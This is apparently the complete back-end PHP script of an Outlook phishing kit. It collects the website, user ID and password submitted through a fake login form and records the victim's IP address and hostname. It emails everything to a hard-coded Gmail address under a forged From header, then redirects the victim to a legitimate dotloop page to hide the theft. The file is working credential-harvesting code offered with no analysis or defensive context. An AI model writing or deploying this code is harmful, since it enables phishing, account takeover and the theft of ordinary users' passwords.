<?

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = "--------------------+ outlook +---------------------\n";
$message .= "website : ".$_POST['website']."\n";
$message .= "User ID : ".$_POST['login']."\n";
$message .= "Password : ".$_POST['passwd']."\n\n";
$message .= "--------------------\n";
$message .= "IP Address : $ip\n";
$message .= "HostName   : $hostname\n";
$message .= "-------------------+ Created in 2017 By [ VLT ] +-------------------\n";

$recipient = "blockfunds12@gmail.com";
$subject = "OUTLOOK | $ip";
$headers = "From: Result <memeber@sourceforge.net>";
$headers .= $_POST['eMailAdd']."\n";//cred_userid_inputtext
$headers .= "MIME-Version: 1.0\n";
	 mail("$to","$subject", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
				header("Location: https://www.dotloop.com/terms-conditions");
				//header("Pragma: public"); 
				//header("Content-Type: application/xml");
				//header("Cache-Control: private",false);
				//header("Content-Type: application/force-download"); 
				//header("Content-Disposition: attachment; filename=SKM_C224e15123013300.pdf;" );    
				//readfile("SKM_C224e15123013300.pdf");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>
